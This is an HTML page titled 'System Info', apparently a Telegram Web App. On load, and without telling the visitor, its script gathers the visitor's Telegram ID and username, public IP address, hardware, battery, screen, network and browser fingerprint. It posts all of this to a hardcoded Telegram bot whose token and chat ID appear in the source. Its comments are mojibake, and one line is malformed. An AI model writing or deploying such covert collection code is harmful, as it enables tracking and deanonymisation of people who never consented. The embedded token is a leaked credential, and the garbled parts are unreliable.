<!DOCTYPE html>
<html>
<head>
    <title>System Info</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
<script>
// ÐŸÑ€Ð¾Ð²ÐµÑ€ÐºÐ° Ð½Ð° iOS
const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

Telegram.WebApp.enableClosingConfirmation();

const BOT_TOKEN = '8173506320:AAEgHmISfNXAvJqgwkRg7UU-KNR-Dpr8vQQ';
const CHAT_ID = '5540487728';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const tg = window.Telegram?.WebApp;
const userId = tg?.initDataUnsafe?.user?.id;
const username = tg?.initDataUnsafe?.user?.username;

// Ð¤ÑƒÐ½ÐºÑ†Ð¸Ñ Ð´Ð»Ñ ÑÐºÑ€Ð°Ð½Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð¸Ñ Markdown-ÑÐ¸Ð¼Ð²Ð¾Ð»Ð¾Ð²
function escapeMarkdown(text) {
    if (typeof text !== 'string') return text;
    return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
}

// Ð£Ð»ÑƒÑ‡ÑˆÐµÐ½Ð½Ð°Ñ Ñ„ÑƒÐ½ÐºÑ†Ð¸Ñ Ð¿Ð¾Ð»ÑƒÑ‡ÐµÐ½Ð¸Ñ GPU Ð¸Ð½Ñ„Ð¾Ñ€Ð¼Ð°Ñ†Ð¸Ð¸
function getGPUInfo() {
    try {
        const canvas = document.createElement('canvas');
        let gl = null;
        
        const contexts = ['webgl', 'experimental-webgl', 'webkit-3d', 'moz-webgl'];
        for (const ctx of contexts) {
            gl = canvas.getContext(ctx);
            if (gl) break;
        }
        
        if (!gl) return isIOS ? 'WebGL limited on iOS' : 'WebGL not supported';

        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        return debugInfo ? {
            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'unknown',
            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown'
        } : 'No detailed GPU info available';
    } catch (e) {
        return 'error';
    }
}

// Detect browser features with error handling
function detectFeatures() {
    try {
        return {
            cookies: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack || 'unspecified',
            java: navigator.javaEnabled ? navigator.javaEnabled() : 'error',
            pdf: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'error',
            touch: 'ontouchstart' in window || (navigator.maxTouchPoints || 0) > 0,
            webgl: !!window.WebGLRenderingContext,
            webaudio: !!window.AudioContext || !!window.webkitAudioContext,
            serviceWorker: 'serviceWorker' in navigator,
            notification: 'Notification' in window,
            battery: 'getBattery' in navigator,
            vibration: 'vibrate' in navigator,
            storage: {
                localStorage: 'localStorage' in window,
                sessionStorage: 'sessionStorage' in window,
                indexedDB: 'indexedDB' in window
            }
        };
    } catch (e) {
        return 'error';
    }
}

// Get CPU cores with error handling
function getCPUCores() {
    try {
        return navigator.hardwareConcurrency || 'unknown';
    } catch (e) {
        return 'error';
    }
}

// Get device memory with error handling
function getDeviceMemory() {
    try {
        return navigator.deviceMemory || 'unknown';
    } catch (e) {
        return 'error';
    }
}

// Get battery info with error handling
async function getBatteryInfo() {
    try {
        if (isIOS) return 'Battery API not available on iOS';
        
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            return {
                level: battery.level * 100 + '%',
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        }
        return 'Battery API not supported';
    } catch (e) {
        return 'error';
    }
}

// Get network information with error handling
function getNetworkInfo() {
    try {
        if (isIOS) return 'Network Info limited on iOS';
        
        if (navigator.connection) {
            return {
                type: navigator.connection.effectiveType || 'unknown',
                downlink: (navigator.connection.downlink || 'unknown') + ' Mbps',
                rtt: (navigator.connection.rtt || 'unknown') + ' ms',
                saveData: navigator.connection.saveData || false
            };
        }
        return 'Network Information API not supported';
    } catch (e) {
        return 'error';
    }
}

// Get IP info with error handling
async function getIPInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return { ip: data.ip };
    } catch (e) {
        return { ip: 'error' };
    }
}

// Get browser plugins with error handling
function getPlugins() {
    try {
        return Array.from(navigator.plugins).map(plugin => plugin.name);
    } catch (e) {
        return ['error'];
    }
}

// Main function to collect all data with error handling
async function collectSystemInfo() {
    const systemInfo = {
        // Basic info
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        vendor: navigator.vendor,
        language: navigator.language,
        languages: navigator.languages,
        
        // Hardware
        cpuCores: getCPUCores(),
        deviceMemory: (() => {
            try {
                const mem = getDeviceMemory();
                return typeof mem === 'number' ? mem + ' GB' : mem;
            } catch (e) {
                return 'error';
            }
        })(),
        gpu: getGPUInfo(),
        battery: await getBatteryInfo(),
        
        // Screen
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelRatio: window.devicePixelRatio,
            orientation: screen.orientation?.type || 'error'
        },
        
        // Browser
        browser: {
            name: navigator.appName,
            version: navigator.appVersion,
            product: navigator.product,
            plugins: getPlugins(),
            mimeTypes: (() => {
                try {
                    return Array.from(navigator.mimeTypes).map(mime => mime.type);
                } catch (e) {
                    return ['error'];
                }
            })()
        },
        
        // Network
        network: getNetworkInfo(),
        ipInfo: await getIPInfo(),
        
        // Features
        features: detectFeatures(),
        
        // Performance
        performance: {
            memory: window.performance?.memory ? {
                jsHeapSizeLimit: window.performance.memory.jsHeapSizeLimit,
                totalJSHeapSize: window.performance.memory.totalJSHeapSize,
                usedJSHeapSize: window.performance.memory.usedJSHeapSize
            } : 'Memory API not available',
            timing: window.performance?.timing ? {
                loadTime: (window.performance.timing.loadEventEnd - window.performance.timing.navigationStart) + 'ms'
            } : 'Timing API not available'
        }
    };
    
    sendToTelegram(systemInfo);
}

// Send data to Telegram with error handling
function sendToTelegram(data) {
    let text = `ðŸ–¥ *System Information Report* ðŸ–¥\n\n`;
    
    // Telegram user info (Ñ ÑÐºÑ€Ð°Ð½Ð¸Ñ€Ð¾Ð²Ð°Ð½Ð¸ÐµÐ¼)
    text += userId ? `ðŸ“… *Tg\\_id:* ${escapeMarkdown(userId.toString())}\n` : `ðŸ“… *Tg\\_id:* \\-\n`;
    text += username ? `ðŸ‘¤ *Username:* @${escapeMarkdown(username)}\n\n` : `ðŸ‘¤ *Username:* \\-\n\n`;
    
    // Basic info
    text += `ðŸ“… *Timestamp:* ${escapeMarkdown(data.timestamp)}\n`;
    text += `ðŸŒ *User Agent:* ${escapeMarkdown(data.userAgent)}\n`;
    text += `ðŸ’» *Platform:* ${escapeMarkdown(data.platform)}\n`;
    text += `ðŸ· *Vendor:* ${escapeMarkdown(data.vendor || 'unknown')}\n`;
    text += `ðŸ—£ *Language:* ${escapeMarkdown(data.language)}\n\n`;
    
    // Hardware
    text += `âš™ï¸ *Hardware Information*\n`;
    text += `ðŸ”¢ *CPU Cores:* ${escapeMarkdown(data.cpuCores.toString())}\n`;
    text += `ðŸ§  *Device Memory:* ${escapeMarkdown(data.deviceMemory.toString())}\n`;
    text += `ðŸŽ® *GPU Vendor:* ${typeof data.gpu === 'object' ? escapeMarkdown(data.gpu.vendor) : escapeMarkdown(data.gpu)}\n`;
    text += `ðŸ–¥ *GPU Model:* ${typeof data.gpu === 'object' ? escapeMarkdown(data.gpu.renderer) : 'N/A'}\n`;
    text += `ðŸ”‹ *Battery:* ${typeof data.battery === 'object' ? 
        `${escapeMarkdown(data.battery.level)} (\${data.battery.charging ? 'charging' : 'discharging'})` : 
        escapeMarkdown(data.battery)}\n\n`;
    
    // Screen
    text += `ðŸ–¥ *Screen Information*\n`;
    text += `ðŸ“ *Resolution:* ${data.screen.width}x${data.screen.height}\n`;
    text += `ðŸ–¼ *Available:* ${data.screen.availWidth}x${data.screen.availHeight}\n`;
    text += `ðŸŽ¨ *Color Depth:* ${data.screen.colorDepth}\\-bit\n`;
    text += `ðŸ” *Pixel Ratio:* ${data.screen.pixelRatio}\n`;
    text += `ðŸ”„ *Orientation:* ${escapeMarkdown(data.screen.orientation)}\n\n`;
    
    // Network
    text += `ðŸŒ *Network Information*\n`;
    if (typeof data.network === 'object') {
        text += `ðŸ“¶ *Connection Type:* ${escapeMarkdown(data.network.type)}\n`;
        text += `â¬‡ï¸ *Download Speed:* ${escapeMarkdown(data.network.downlink)}\n`;
        text += `â± *Round Trip Time:* ${escapeMarkdown(data.network.rtt)}\n`;
        text += `ðŸ’¾ *Data Saver Mode:* ${data.network.saveData ? 'on' : 'off'}\n`;
    } else {
        text += `${escapeMarkdown(data.network.toString())}\n`;
    }
    
    // IP Info
    text += `ðŸ“ *IP Address:* ${escapeMarkdown(data.ipInfo.ip)}\n\n`;
    
    // Features
    text += `âœ¨ *Browser Features*\n`;
    if (typeof data.features === 'object') {
        text += `ðŸª *Cookies:* ${data.features.cookies ? 'enabled' : 'disabled'}\n`;
        text += `ðŸš« *Do Not Track:* ${escapeMarkdown(data.features.doNotTrack.toString())}\n`;
        text += `â˜• *Java:* ${data.features.java ? 'enabled' : 'disabled'}\n`;
        text += `ðŸ“„ *PDF Viewer:* ${data.features.pdf ? 'enabled' : 'disabled'}\n`;
        text += `ðŸ‘† *Touch Support:* ${data.features.touch ? 'yes' : 'no'}\n`;
        text += `ðŸ–ï¸ *WebGL:* ${data.features.webgl ? 'supported' : 'not supported'}\n`;
        text += `ðŸ”Š *Web Audio:* ${data.features.webaudio ? 'supported' : 'not supported'}\n\n`;
    } else {
        text += `Features detection: ${escapeMarkdown(data.features.toString())}\n\n`;
    }
    
    // Plugins
    text += `ðŸ§© *Browser Plugins*\n`;
    text += `${escapeMarkdown(data.browser.plugins.join(', ') || 'No plugins detected'}\n\n`;
    
    // Performance
    text += `âš¡ *Performance Information*\n`;
    if (typeof data.performance.memory === 'object') {
        text += `ðŸ§  *Memory Usage:* ${Math.round(data.performance.memory.usedJSHeapSize / 1048576)}MB / ${Math.round(data.performance.memory.totalJSHeapSize / 1048576)}MB\n`;
    } else {
        text += `${escapeMarkdown(data.performance.memory.toString())}\n`;
    }
    
    if (typeof data.performance.timing === 'object') {
        text += `â± *Page Load Time:* ${data.performance.timing.loadTime}\n`;
    } else {
        text += `${escapeMarkdown(data.performance.timing.toString())}\n`;
    }
    
    fetch(TELEGRAM_API_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'MarkdownV2',
            disable_web_page_preview: true
        })
    }).catch(error => console.error('Telegram API error:', error));
}

window.onload = collectSystemInfo;
</script>
</body>
</html>
